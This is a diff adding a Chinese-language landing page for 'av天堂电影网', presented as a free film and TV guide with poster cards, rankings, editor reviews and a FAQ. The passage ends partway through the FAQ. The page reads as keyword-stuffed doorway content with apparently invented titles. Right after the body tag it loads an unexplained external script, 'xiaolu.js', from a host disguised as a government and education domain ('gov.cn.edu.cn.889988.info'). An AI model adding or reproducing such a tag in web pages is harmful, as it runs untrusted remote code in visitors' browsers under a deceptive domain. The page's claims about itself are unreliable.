@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>av天堂电影网 - 高清电影电视剧免费在线观看 | avtiantangdianyingwang-wap</title>
+<meta name="description" content="av天堂电影网（avtiantangdianyingwang-wap）提供最新高清电影、热播电视剧、综艺、动漫与短剧在线观看资讯，支持手机端自适应访问，无需注册，每日更新热榜与分类片单。">
+<meta name="keywords" content="av天堂电影网, avtiantangdianyingwang-wap, 高清电影在线观看, 热播电视剧, 免费影视资讯, 短剧动漫">
+<meta name="robots" content="index, follow, max-image-preview:large">
+<link rel="canonical" href="https://avtiantangdianyingwang-wap/">
+<style>
+:root{
+  --bg:#0b0712; --ink:#f4f1ff; --sub:#b3accc; --gold:#ffcf6b; --rose:#ff7ab2;
+  --violet:#8b5cf6; --teal:#34d399; --line:rgba(255,255,255,.11);
+  --card:rgba(255,255,255,.05); --rad:20px; --max:1200px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:var(--bg); color:var(--ink); line-height:1.75; overflow-x:hidden;
+  -webkit-font-smoothing:antialiased;
+}
+body::before{
+  content:""; position:fixed; inset:0; z-index:-2;
+  background:
+    radial-gradient(720px 460px at 85% -5%, rgba(139,92,246,.32), transparent 62%),
+    radial-gradient(640px 500px at 8% 12%, rgba(255,122,178,.20), transparent 62%),
+    radial-gradient(600px 420px at 50% 108%, rgba(255,207,107,.16), transparent 62%);
+}
+body::after{
+  content:""; position:fixed; inset:0; z-index:-1; opacity:.05;
+  background-image:radial-gradient(circle at 1px 1px, #fff 1px, transparent 0);
+  background-size:30px 30px;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--max);margin:0 auto;padding:0 22px}
+
+/* Header */
+header{position:sticky;top:0;z-index:100;background:rgba(11,7,18,.82);backdrop-filter:blur(14px);
+  border-bottom:1px solid var(--line)}
+.hd{display:flex;align-items:center;justify-content:space-between;height:68px;gap:16px}
+.logo{display:flex;align-items:center;gap:12px;font-weight:800;font-size:21px;white-space:nowrap}
+.logo .orb{width:40px;height:40px;border-radius:50%;display:grid;place-items:center;font-size:18px;
+  background:conic-gradient(from 90deg,var(--gold),var(--rose),var(--violet),var(--gold));
+  box-shadow:0 0 22px rgba(255,122,178,.45);position:relative}
+.logo .orb::after{content:"";position:absolute;inset:6px;border-radius:50%;background:var(--bg)}
+.logo .orb span{position:relative;z-index:2;color:#fff}
+nav ul{display:flex;gap:2px;list-style:none}
+nav a{display:block;padding:9px 15px;border-radius:12px;font-size:15px;color:var(--sub);transition:.25s}
+nav a:hover{color:#fff;background:rgba(255,255,255,.08)}
+.menu-btn{display:none;width:44px;height:44px;border:1px solid var(--line);border-radius:13px;
+  background:var(--card);color:#fff;font-size:21px;cursor:pointer}
+
+/* Hero */
+.hero{padding:88px 0 64px;position:relative}
+.kicker{display:inline-flex;align-items:center;gap:8px;padding:7px 15px;border-radius:999px;
+  font-size:13px;color:var(--gold);border:1px solid rgba(255,207,107,.3);
+  background:rgba(255,207,107,.08);margin-bottom:24px}
+.hero h1{font-size:clamp(36px,6.6vw,70px);line-height:1.12;font-weight:900;letter-spacing:-1.5px}
+.hero h1 em{font-style:normal;color:var(--gold)}
+.hero p.lead{margin-top:24px;max-width:640px;font-size:18px;color:var(--sub)}
+.url{margin-top:28px;display:inline-flex;align-items:center;gap:10px;flex-wrap:wrap;padding:12px 18px;
+  border:1px dashed rgba(255,255,255,.26);border-radius:14px;font-size:14px;color:var(--sub)}
+.url code{color:var(--teal);font-weight:700;letter-spacing:.4px}
+.acts{margin-top:34px;display:flex;gap:14px;flex-wrap:wrap}
+.btn{padding:15px 32px;border-radius:14px;font-size:16px;font-weight:700;border:0;cursor:pointer;transition:.25s}
+.btn-g{color:#16091f;background:linear-gradient(110deg,var(--gold),var(--rose));box-shadow:0 10px 30px rgba(255,122,178,.32)}
+.btn-g:hover{transform:translateY(-3px);box-shadow:0 16px 42px rgba(255,122,178,.42)}
+.btn-o{color:#fff;background:rgba(255,255,255,.08);border:1px solid var(--line)}
+.btn-o:hover{background:rgba(255,255,255,.15)}
+.stats{margin-top:52px;display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.stat{padding:20px;border:1px solid var(--line);border-radius:16px;background:var(--card)}
+.stat b{display:block;font-size:30px;font-weight:900;color:#fff}
+.stat b i{font-style:normal;color:var(--gold)}
+.stat span{font-size:13px;color:var(--sub)}
+
+/* Sections */
+section{padding:72px 0}
+.sec-head{display:flex;align-items:end;justify-content:space-between;gap:18px;margin-bottom:36px;flex-wrap:wrap}
+.eyebrow{font-size:13px;letter-spacing:2.5px;text-transform:uppercase;color:var(--rose);margin-bottom:8px}
+.sec-head h2{font-size:clamp(25px,4.2vw,38px);font-weight:900;letter-spacing:-.6px}
+.sec-head h2 s{text-decoration:none;color:var(--gold)}
+.sec-head p{color:var(--sub);font-size:15px;max-width:420px}
+
+/* Poster cards */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(215px,1fr));gap:22px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:var(--rad);overflow:hidden;transition:.35s}
+.card:hover{transform:translateY(-7px);border-color:rgba(255,207,107,.45);box-shadow:0 22px 54px rgba(0,0,0,.5)}
+.poster{aspect-ratio:2/3;position:relative;display:flex;align-items:flex-start;justify-content:space-between;
+  padding:13px;color:#fff;font-weight:800;font-size:18px}
+.poster .g{position:absolute;inset:0;z-index:0}
+.poster .star{position:relative;z-index:2;padding:4px 10px;border-radius:8px;font-size:12px;font-weight:700;
+  background:rgba(0,0,0,.5);backdrop-filter:blur(4px)}
+.poster .epi{position:relative;z-index:2;padding:4px 10px;border-radius:8px;font-size:12px;font-weight:700;
+  background:var(--gold);color:#1a0d05}
+.card-body{padding:14px 16px 18px}
+.card-body h3{font-size:16px;margin-bottom:6px}
+.card-body p{font-size:13px;color:var(--sub);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.tags{margin-top:12px;display:flex;gap:6px;flex-wrap:wrap}
+.tag{font-size:12px;padding:3px 10px;border-radius:8px;background:rgba(139,92,246,.18);color:#ddd0ff}
+
+/* Tabs */
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:26px}
+.tab{padding:9px 18px;border-radius:999px;font-size:14px;font-weight:600;cursor:pointer;
+  border:1px solid var(--line);background:var(--card);color:var(--sub);transition:.25s}
+.tab.on{color:#16091f;background:linear-gradient(110deg,var(--gold),var(--rose));border-color:transparent}
+.tabpane{display:none}
+.tabpane.on{display:block}
+
+/* Marquee strip */
+.strip{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:14px}
+.stp{padding:24px 20px;border-radius:16px;border:1px solid var(--line);position:relative;overflow:hidden;
+  background:linear-gradient(160deg,rgba(255,255,255,.07),rgba(255,255,255,.02));transition:.3s}
+.stp .gl{position:absolute;width:130px;height:130px;border-radius:50%;right:-56px;top:-56px;opacity:.16;transition:.3s}
+.stp:hover{transform:translateY(-5px)}
+.stp:hover .gl{opacity:.32}
+.stp .ic{font-size:28px;margin-bottom:13px}
+.stp h3{font-size:18px;margin-bottom:7px}
+.stp p{font-size:14px;color:var(--sub)}
+
+/* Rank */
+.rank{display:grid;gap:12px}
+.rk{display:grid;grid-template-columns:56px 1fr auto;align-items:center;gap:18px;padding:16px 20px;
+  border-radius:14px;background:var(--card);border:1px solid var(--line);transition:.25s}
+.rk:hover{border-color:rgba(52,211,153,.5);background:rgba(52,211,153,.07)}
+.rk .n{font-size:26px;font-weight:900;color:var(--line);font-variant-numeric:tabular-nums}
+.rk .n.top{color:var(--gold)}
+.rk .tt h4{font-size:17px}
+.rk .tt p{font-size:13px;color:var(--sub)}
+.rk .hv{font-size:14px;font-weight:800;color:var(--teal);white-space:nowrap}
+
+/* Reviews */
+.revs{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px}
+.rev{padding:24px;border-radius:18px;border:1px solid var(--line);background:var(--card);transition:.3s}
+.rev:hover{transform:translateY(-5px);border-color:rgba(139,92,246,.45)}
+.rev .who{display:flex;align-items:center;gap:12px;margin-bottom:14px}
+.rev .av{width:44px;height:44px;border-radius:12px;display:grid;place-items:center;font-size:18px;font-weight:800;color:#16091f}
+.rev .who b{display:block;font-size:15px}
+.rev .who span{font-size:12px;color:var(--sub)}
+.rev blockquote{font-size:15px;color:#e8e4f5;position:relative;padding-left:16px;border-left:2px solid var(--rose)}
+.rev .meta{margin-top:16px;display:flex;justify-content:space-between;font-size:13px;color:var(--sub)}
+
+/* FAQ */
+.faq details{border:1px solid var(--line);border-radius:14px;margin-bottom:12px;background:var(--card);overflow:hidden}
+.faq summary{padding:18px 22px;cursor:pointer;font-weight:700;font-size:17px;list-style:none;
+  display:flex;justify-content:space-between;gap:14px}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"＋";color:var(--gold);font-size:22px;transition:.3s;flex:0 0 auto}
+.faq details[open] summary::after{transform:rotate(45deg)}
+.faq .a{padding:0 22px 20px;color:var(--sub)}
+
+/* Footer */
+footer{border-top:1px solid var(--line);padding:48px 0 28px;margin-top:24px}
+.ft{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:32px}
+.ft .logo{margin-bottom:14px}
+.ft p{color:var(--sub);font-size:14px;max-width:320px}
+.ft h4{font-size:15px;margin-bottom:14px}
+.ft ul{list-style:none;display:grid;gap:9px}
+.ft a{color:var(--sub);font-size:14px;transition:.2s}
+.ft a:hover{color:var(--gold)}
+.copy{padding-top:26px;margin-top:34px;border-top:1px solid var(--line);display:flex;justify-content:space-between;
+  flex-wrap:wrap;gap:10px;color:var(--sub);font-size:13px}
+
+/* Reveal */
+.rv{opacity:0;transform:translateY(26px);transition:.7s cubic-bezier(.2,.7,.3,1)}
+.rv.in{opacity:1;transform:none}
+@media (prefers-reduced-motion:reduce){.rv{opacity:1;transform:none;transition:none}}
+@media (max-width:900px){
+  nav ul{display:none;position:absolute;top:68px;left:0;right:0;flex-direction:column;
+    background:rgba(13,8,22,.98);padding:16px;border-bottom:1px solid var(--line)}
+  nav ul.open{display:flex}
+  nav a{padding:14px 20px;border-radius:10px}
+  .menu-btn{display:grid;place-items:center}
+  .stats{grid-template-columns:1fr 1fr}
+  section{padding:56px 0}
+  .hero{padding:56px 0 42px}
+}
+@media (max-width:560px){
+  .wrap{padding:0 16px}
+  .ft,.stats{grid-template-columns:1fr}
+  .rk{grid-template-columns:44px 1fr;gap:12px}
+  .rk .hv{grid-column:2;white-space:normal}
+  .btn{padding:13px 24px;font-size:15px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="wrap hd">
+    <div class="logo">
+      <span class="orb" aria-hidden="true"><span>天</span></span>
+      av天堂电影网
+    </div>
+    <nav>
+      <button class="menu-btn" id="menuBtn" aria-label="菜单">☰</button>
+      <ul id="nav">
+        <li><a href="#home">首页</a></li>
+        <li><a href="#films">电影大片</a></li>
+        <li><a href="#series">热播剧集</a></li>
+        <li><a href="#cats">频道分类</a></li>
+        <li><a href="#rank">热度榜单</a></li>
+        <li><a href="#reviews">影评专栏</a></li>
+        <li><a href="#faq">常见问题</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main>
+
+  <section class="hero wrap" id="home">
+    <span class="kicker">✦ av天堂电影网 · 今晚看什么，三分钟定下来</span>
+    <h1>把av天堂电影网<br>装进<em>你的口袋</em></h1>
+    <p class="lead">av天堂电影网（avtiantangdianyingwang-wap）聚合最新院线大片、热播电视剧、综艺、动漫与短剧，配合编辑日更精选榜与实时热度榜，手机、平板、电脑自适应浏览，无需注册即可查阅完整片单。</p>
+    <div class="url">
+      官方网站地址：<code>https://avtiantangdianyingwang-wap</code>
+    </div>
+    <div class="acts">
+      <a class="btn btn-g" href="#films">查看今日热榜</a>
+      <a class="btn btn-o" href="#cats">按频道筛选</a>
+    </div>
+    <div class="stats">
+      <div class="stat rv"><b><i>10</i>万+</b><span>可查影片与剧集</span></div>
+      <div class="stat rv"><b><i>6</i>大</b><span>影视内容频道</span></div>
+      <div class="stat rv"><b><i>24</i>小时</b><span>片单实时更新</span></div>
+      <div class="stat rv"><b><i>100</i>%</b><span>手机端自适应</span></div>
+    </div>
+  </section>
+
+  <section id="films" class="wrap">
+    <div class="sec-head rv">
+      <div>
+        <div class="eyebrow">FEATURED FILMS</div>
+        <h2>今日<em>电影大片</em></h2>
+      </div>
+      <p>院线新片、高分口碑与经典修复三线并行，每一部的推荐理由都由编辑亲看过后再写。</p>
+    </div>
+    <div class="grid">
+      <article class="card rv">
+        <div class="poster">
+          <div class="g" style="background:linear-gradient(140deg,#1a2980,#26d0ce)"></div>
+          <span class="star">★ 8.7</span><span class="epi">热映</span>
+        </div>
+        <div class="card-body">
+          <h3>极光之下</h3>
+          <p>极夜中的科考站失联七天，最后传回来的不是求救信号，而是一段循环播放的钢琴曲。</p>
+          <div class="tags"><span class="tag">科幻</span><span class="tag">悬疑</span><span class="tag">2026</span></div>
+        </div>
+      </article>
+      <article class="card rv">
+        <div class="poster">
+          <div class="g" style="background:linear-gradient(140deg,#3a1c71,#d76d77,#ffaf7b)"></div>
+          <span class="star">★ 8.9</span><span class="epi">口碑</span>
+        </div>
+        <div class="card-body">
+          <h3>旧城理发师</h3>
+          <p>一把剃刀用了四十年，他剪过的头发里藏着整条街的三十年变迁。</p>
+          <div class="tags"><span class="tag">剧情</span><span class="tag">年代</span><span class="tag">2025</span></div>
+        </div>
+      </article>
+      <article class="card rv">
+        <div class="poster">
+          <div class="g" style="background:linear-gradient(140deg,#42275a,#734b6d)"></div>
+          <span class="star">★ 8.3</span><span class="epi">新片</span>
+        </div>
+        <div class="card-body">
+          <h3>山海食录</h3>
+          <p>山海经里的异兽被做成了一本食谱，每道菜都对应一个消失的村落。</p>
+          <div class="tags"><span class="tag">奇幻</span><span class="tag">美食</span><span class="tag">2026</span></div>
+        </div>
+      </article>
+      <article class="card rv">
+        <div class="poster">
+          <div class="g" style="background:linear-gradient(140deg,#232526,#414345)"></div>
+          <span class="star">★ 8.5</span><span class="epi">动作</span>
+        </div>
+        <div class="card-body">
+          <h3>零点快车</h3>
+          <p>一列只在午夜发车的列车，乘客名单上多了一个早已注销的名字。</p>
+          <div class="tags"><span class="tag">动作</span><span class="tag">犯罪</span><span class="tag">2025</span></div>
+        </div>
+      </article>
+      <article class="card rv">
+        <div class="poster">
+          <div class="g" style="background:linear-gradient(140deg,#870000,#190a05)"></div>
+          <span class="star">★ 8.1</span><span class="epi">治愈</span>
+        </div>
+        <div class="card-body">
+          <h3>迟到的春天</h3>
+          <p>一封迟到二十年的信，让三个陌生家庭在春天重新认领彼此。</p>
+          <div class="tags"><span class="tag">温情</span><span class="tag">家庭</span><span class="tag">2025</span></div>
+        </div>
+      </article>
+      <article class="card rv">
+        <div class="poster">
+          <div class="g" style="background:linear-gradient(140deg,#114357,#f29492)"></div>
+          <span class="star">★ 7.8</span><span class="epi">喜剧</span>
+        </div>
+        <div class="card-body">
+          <h3>最后一次相亲</h3>
+          <p>她决定再相一次亲就放弃，结果对方是十年前分手的那个人。</p>
+          <div class="tags"><span class="tag">爱情</span><span class="tag">喜剧</span><span class="tag">2026</span></div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <section id="series" class="wrap">
+    <div class="sec-head rv">
+      <div>
+        <div class="eyebrow">TV SERIES</div>
+        <h2>追更不<em>断档的剧集</em></h2>
+      </div>
+      <p>优先收录更新节奏稳定、单集信息量足的剧，避开"追到一半断更"和"注水拖沓"两个坑。</p>
+    </div>
+    <div class="tabs rv">
+      <button class="tab on" data-t="a">国产剧</button>
+      <button class="tab" data-t="b">美剧韩剧</button>
+      <button class="tab" data-t="c">短剧精选</button>
+      <button class="tab" data-t="d">动漫番剧</button>
+    </div>
+    <div class="tabpane on" id="pane-a">
+      <div class="grid">
+        <article class="card rv">
+          <div class="poster">
+            <div class="g" style="background:linear-gradient(140deg,#1d4350,#a43931)"></div>
+            <span class="star">★ 9.0</span><span class="epi">24集</span>
+          </div>
+          <div class="card-body">
+            <h3>城北旧事</h3>
+            <p>一座老城进入拆迁倒计时，三代人各自藏着的秘密被同时翻出。</p>
+            <div class="tags"><span class="tag">年代</span><span class="tag">群像</span><span class="tag">连载中</span></div>
+          </div>
+        </article>
+        <article class="card rv">
+          <div class="poster">
+            <div class="g" style="background:linear-gradient(140deg,#3c1053,#ad5389)"></div>
+            <span class="star">★ 8.6</span><span class="epi">18集</span>
+          </div>
+          <div class="card-body">
+            <h3>无声证人</h3>
+            <p>法庭戏一镜到底，被告、律师与旁听席都在同一口气里转身。</p>
+            <div class="tags"><span class="tag">律政</span><span class="tag">悬疑</span><span class="tag">连载中</span></div>
+          </div>
+        </article>
+        <article class="card rv">
+          <div class="poster">
+            <div class="g" style="background:linear-gradient(140deg,#0b486b,#f56217)"></div>
+            <span class="star">★ 8.4</span><span class="epi">30集</span>
+          </div>
+          <div class="card-body">
+            <h3>海上星期三</h3>
+            <p>渡轮上的咖啡馆，每周三迎来一个改变主角一天的人。</p>
+            <div class="tags"><span class="tag">治愈</span><span class="tag">单元剧</span><span class="tag">连载中</span></div>
+          </div>
+        </article>
+        <article class="card rv">
+          <div class="poster">
+            <div class="g" style="background:linear-gradient(140deg,#556270,#4ecdc4)"></div>
+            <span class="star">★ 8.2</span><span class="epi">完结</span>
+          </div>
+          <div class="card-body">
+            <h3>代码与玫瑰</h3>
+            <p>两个程序员把分手写进了开源项目，全网围观他们的 commit 记录。</p>
+            <div class="tags"><span class="tag">都市</span><span class="tag">轻喜剧</span><span class="tag">全16集</span></div>
+          </div>
+        </article>
+      </div>
+    </div>
+    <div class="tabpane" id="pane-b">
+      <div class="grid">
+        <article class="card rv">
+          <div class="poster">
+            <div class="g" style="background:linear-gradient(140deg,#0f2027,#203a43,#2c5364)"></div>
+            <span class="star">★ 9.2</span><span class="epi">S5</span>
+          </div>
+          <div class="card-body">
+            <h3>暗涌之城</h3>
+            <p>第五季开场就是三年后的时间跳跃，所有人都换了身份。</p>
+            <div class="tags"><span class="tag">犯罪</span><span class="tag">剧情</span><span class="tag">连载中</span></div>
+          </div>
+        </article>
+        <article class="card rv">
+          <div class="poster">
+            <div class="g" style="background:linear-gradient(140deg,#42275a,#734b6d)"></div>
+            <span class="star">★ 8.8</span><span class="epi">10集</span>
+          </div>
+          <div class="card-body">
+            <h3>黑礁事务所</h3>
+            <p>一栋旧楼里的六位住户，各自接到同一封匿名委托信。</p>
+            <div class="tags"><span class="tag">悬疑</span><span class="tag">韩剧</span><span class="tag">连载中</span></div>
+          </div>
+        </article>
+        <article class="card rv">
+          <div class="poster">
+            <div class="g" style="background:linear-gradient(140deg,#1a2980,#26d0ce)"></div>
+            <span class="star">★ 8.5</span><span class="epi">完结</span>
+          </div>
+          <div class="card-body">
+            <h3>玻璃花园</h3>
+            <p>植物学家与建筑师的合作，意外揭开一座温室的百年档案。</p>
+            <div class="tags"><span class="tag">治愈</span><span class="tag">日剧</span><span class="tag">全8集</span></div>
+          </div>
+        </article>
+        <article class="card rv">
+          <div class="poster">
+            <div class="g" style="background:linear-gradient(140deg,#870000,#190a05)"></div>
+            <span class="star">★ 8.0</span><span class="epi">12集</span>
+          </div>
+          <div class="card-body">
+            <h3>最后一班岗</h3>
+            <p>退休前最后一周，他主动申请回到自己三十年前办过的旧案。</p>
+            <div class="tags"><span class="tag">警匪</span><span class="tag">美剧</span><span class="tag">连载中</span></div>
+          </div>
+        </article>
+      </div>
+    </div>
+    <div class="tabpane" id="pane-c">
+      <div class="grid">
+        <article class="card rv">
+          <div class="poster">
+            <div class="g" style="background:linear-gradient(140deg,#3a1c71,#d76d77)"></div>
+            <span class="star">★ 8.4</span><span class="epi">80集</span>
+          </div>
+          <div class="card-body">
+            <h3>归来凤栖处</h3>
+            <p>重生医妃误嫁王爷死对头，开局即满级反杀节奏。</p>
+            <div class="tags"><span class="tag">古装</span><span class="tag">重生</span><span class="tag">连载中</span></div>
+          </div>
+        </article>
+        <article class="card rv">
+          <div class="poster">
+            <div class="g" style="background:linear-gradient(140deg,#114357,#f29492)"></div>
+            <span class="star">★ 8.1</span><span class="epi">60集</span>
+          </div>
+          <div class="card-body">
+            <h3>一眼定乾坤</h3>
+            <p>都市赌石少年的第一刀切开后，整个行业都被他搅动了。</p>
+            <div class="tags"><span class="tag">都市</span><span class="tag">逆袭</span><span class="tag">连载中</span></div>
+          </div>
+        </article>
+        <article class="card rv">
+          <div class="poster">
+            <div class="g" style="background:linear-gradient(140deg,#232526,#414345)"></div>
+            <span class="star">★ 7.9</span><span class="epi">100集</span>
+          </div>
+          <div class="card-body">
+            <h3>年代：每日盲盒</h3>
+            <p>穿越到物资匮乏年代，她靠"盲盒"一点点堆满整个仓库。</p>
+            <div class="tags"><span class="tag">年代</span><span class="tag">女频</span><span class="tag">连载中</span></div>
+          </div>
+        </article>
+        <article class="card rv">
+          <div class="poster">
+            <div class="g" style="background:linear-gradient(140deg,#42275a,#734b6d)"></div>
+            <span class="star">★ 8.2</span><span class="epi">全集</span>
+          </div>
+          <div class="card-body">
+            <h3>妖孽下山</h3>
+            <p>七个师姐各有绝活，下山第一天就联手把仇家盘了个遍。</p>
+            <div class="tags"><span class="tag">仙侠</span><span class="tag">爽剧</span><span class="tag">完结</span></div>
+          </div>
+        </article>
+      </div>
+    </div>
+    <div class="tabpane" id="pane-d">
+      <div class="grid">
+        <article class="card rv">
+          <div class="poster">
+            <div class="g" style="background:linear-gradient(140deg,#0f2027,#2c5364)"></div>
+            <span class="star">★ 9.1</span><span class="epi">连载</span>
+          </div>
+          <div class="card-body">
+            <h3>长风渡·外传</h3>
+            <p>国漫续作把镜头转向配角，群像线比主线更敢下笔。</p>
+            <div class="tags"><span class="tag">国漫</span><span class="tag">热血</span><span class="tag">连载中</span></div>
+          </div>
+        </article>
+        <article class="card rv">
+          <div class="poster">
+            <div class="g" style="background:linear-gradient(140deg,#870000,#ffaf7b)"></div>
+            <span class="star">★ 8.7</span><span class="epi">连载</span>
+          </div>
+          <div class="card-body">
+            <h3>迷宫图书馆</h3>
+            <p>能借走记忆的图书馆，每次归还都会少掉一段自己的过去。</p>
+            <div class="tags"><span class="tag">奇幻</span><span class="tag">日漫</span><span class="tag">连载中</span></div>
+          </div>
+        </article>
+        <article class="card rv">
+          <div class="poster">
+            <div class="g" style="background:linear-gradient(140deg,#1a2980,#d76d77)"></div>
+            <span class="star">★ 8.4</span><span class="epi">剧场版</span>
+          </div>
+          <div class="card-body">
+            <h3>深海来电</h3>
+            <p>剧场版把整条主线收束在一通跨越三千海里的电话里。</p>
+            <div class="tags"><span class="tag">剧场版</span><span class="tag">治愈</span><span class="tag">已上映</span></div>
+          </div>
+        </article>
+        <article class="card rv">
+          <div class="poster">
+            <div class="g" style="background:linear-gradient(140deg,#556270,#ffcf6b)"></div>
+            <span class="star">★ 8.6</span><span class="epi">完结</span>
+          </div>
+          <div class="card-body">
+            <h3>机械小满</h3>
+            <p>一台旧清扫机器人学会了做梦，梦到的都是主人的童年。</p>
+            <div class="tags"><span class="tag">科幻</span><span class="tag">治愈</span><span class="tag">全12集</span></div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section id="cats" class="wrap">
+    <div class="sec-head rv">
+      <div>
+        <div class="eyebrow">CHANNELS</div>
+        <h2>六个频道<em>覆盖全部心情</em></h2>
+      </div>
+      <p>不想翻页的时候，直接从频道入口选一条最短路径，三十秒定位今晚想看的那一类。</p>
+    </div>
+    <div class="strip">
+      <a class="stp rv" href="#" style="--g:linear-gradient(140deg,#1a2980,#26d0ce)">
+        <span class="gl" style="background:var(--g)"></span>
+        <div class="ic">🎬</div><h3>电影大片</h3>
+        <p>院线新片、独立佳作、经典修复三线并行更新。</p>
+      </a>
+      <a class="stp rv" href="#" style="--g:linear-gradient(140deg,#3a1c71,#d76d77)">
+        <span class="gl" style="background:var(--g)"></span>
+        <div class="ic">📺</div><h3>电视剧集</h3>
+        <p>国产剧、美剧、韩剧、日剧，按更新状态筛选。</p>
+      </a>
+      <a class="stp rv" href="#" style="--g:linear-gradient(140deg,#114357,#f29492)">
+        <span class="gl" style="background:var(--g)"></span>
+        <div class="ic">🎭</div><h3>综艺娱乐</h3>
+        <p>真人秀、竞演、脱口秀，每周精选 TOP10。</p>
+      </a>
+      <a class="stp rv" href="#" style="--g:linear-gradient(140deg,#232526,#ffcf6b)">
+        <span class="gl" style="background:var(--g)"></span>
+        <div class="ic">🎞️</div><h3>动漫番剧</h3>
+        <p>国漫与日漫双线更新，剧场版单独成榜。</p>
+      </a>
+      <a class="stp rv" href="#" style="--g:linear-gradient(140deg,#870000,#ffaf7b)">
+        <span class="gl" style="background:var(--g)"></span>
+        <div class="ic">📱</div><h3>短剧精选</h3>
+        <p>古装、都市、年代、女频，按集数与类型筛选。</p>
+      </a>
+      <a class="stp rv" href="#" style="--g:linear-gradient(140deg,#0f2027,#2c5364)">
+        <span class="gl" style="background:var(--g)"></span>
+        <div class="ic">💡</div><h3>影讯资讯</h3>
+        <p>上映档期、预告片、幕后特辑与深度影评。</p>
+      </a>
+    </div>
+  </section>
+
+  <section id="rank" class="wrap">
+    <div class="sec-head rv">
+      <div>
+        <div class="eyebrow">HOT RANKING</div>
+        <h2>本周<em>热门榜单</em></h2>
+      </div>
+      <p>只看两件事：真实播放完成度与用户主动搜索量，刷出来的热度不进榜。</p>
+    </div>
+    <div class="rank rv">
+      <a class="rk" href="#"><span class="n top">01</span><span class="tt"><h4>极光之下</h4><p>科幻 / 悬疑 · 2026 · 热映中</p></span><span class="hv">热度 9852</span></a>
+      <a class="rk" href="#"><span class="n top">02</span><span class="tt"><h4>旧城理发师</h4><p>剧情 / 年代 · 2025 · 口碑上升</p></span><span class="hv">热度 9410</span></a>
+      <a class="rk" href="#"><span class="n top">03</span><span class="tt"><h4>暗涌之城 第五季</h4><p>犯罪 / 剧情 · 美剧 · 连载中</p></span><span class="hv">热度 9127</span></a>
+      <a class="rk" href="#"><span class="n">04</span><span class="tt"><h4>城北旧事</h4><p>年代 / 群像 · 24集 · 连载中</p></span><span class="hv">热度 8765</span></a>
+      <a class="rk" href="#"><span class="n">05</span><span class="tt"><h4>山海食录</h4><p>奇幻 / 美食 · 2026 · 新片</p></span><span class="hv">热度 8293</span></a>
+      <a class="rk" href="#"><span class="n">06</span><span class="tt"><h4>无声证人</h4><p>律政 / 悬疑 · 18集 · 连载中</p></span><span class="hv">热度 7988</span></a>
+      <a class="rk" href="#"><span class="n">07</span><span class="tt"><h4>零点快车</h4><p>动作 / 犯罪 · 2025 · 热映中</p></span><span class="hv">热度 7560</span></a>
+      <a class="rk" href="#"><span class="n">08</span><span class="tt"><h4>归来凤栖处</h4><p>古装 / 重生短剧 · 连载中</p></span><span class="hv">热度 7124</span></a>
+    </div>
+  </section>
+
+  <section id="reviews" class="wrap">
+    <div class="sec-head rv">
+      <div>
+        <div class="eyebrow">EDITOR'S PICK</div>
+        <h2>编辑部<em>真实短评</em></h2>
+      </div>
+      <p>不写八股话术，只说"谁适合看、哪里没接住"，看完再决定要不要点开。</p>
+    </div>
+    <div class="revs">
+      <article class="rev rv">
+        <div class="who"><span class="av" style="background:#ffcf6b">陈</span><div><b>陈编辑</b><span>看片 1200+ · 偏悬疑科幻</span></div></div>
+        <blockquote>《极光之下》的前半小时在"装神秘"，但从第七分钟那通电话开始就收不回来了，科幻设定服务于情绪而不是炫技。</blockquote>
+        <div class="meta"><span>适合：喜欢慢热烧脑</span><span>推荐度 ★★★★☆</span></div>
+      </article>
+      <article class="rev rv">
+        <div class="who"><span class="av" style="background:#8b5cf6;color:#fff">林</span><div><b>林编辑</b><span>看片 860+ · 偏年代家庭</span></div></div>
+        <blockquote>《旧城理发师》全片没有一个坏人，却让人看得心里发紧。配角是今年最被低估的一群演员。</blockquote>
+        <div class="meta"><span>适合：家庭一起看</span><span>推荐度 ★★★★★</span></div>
+      </article>
+      <article class="rev rv">
+        <div class="who"><span class="av" style="background:#34d399;color:#07231a">阿</span><div><b>阿Ken</b><span>短剧频道主理 · 偏爽剧</span></div></div>
+        <blockquote>《归来凤栖处》的节奏是真敢快进，前三集就完成三次身份反转，但配角动机写得偏薄，看个爽就够。</blockquote>
+        <div class="meta"><span>适合：碎片时间追</span><span>推荐度 ★★★★☆</span></div>
+      </article>
+    </div>
+  </section>
+
+  <section id="faq" class="wrap">
+    <div class="sec-head rv">
+      <div>
+        <div class="eyebrow">FAQ</div>
+        <h2>关于<em>av天堂电影网</em>的常见问题</h2>
+      </div>
+      <p>访问方式、片单更新节奏与内容定位，都在这四句话里说清。</p>
+    </div>
+    <div class="faq">
+      <details class="rv" open>
+        <summary>av天堂电影网（avtiantangdianyingwang-wap）是什么？</summary>
+        <div class="a">av天堂电影网是一个影视内容导航与资讯平台，汇总最新热播电影、电视剧、综艺、动漫与短剧，并提供分类频道、热度排行与编辑精选片单，帮助用户更快决定今晚看什么。</div>
+      </details>
+      <details class="rv">
+        <summary>浏览片单需要注册或付费吗？</summary>
+        <div class="a">浏览榜单、频道分类与影评资讯无需注册。部分个性化提醒与深度内容可按需开启，具体以页面实时提示为准。</div>
+      </details>
+      <details class="rv">
+        <summary>手机、平板和电脑显示效果一样吗？</summary>
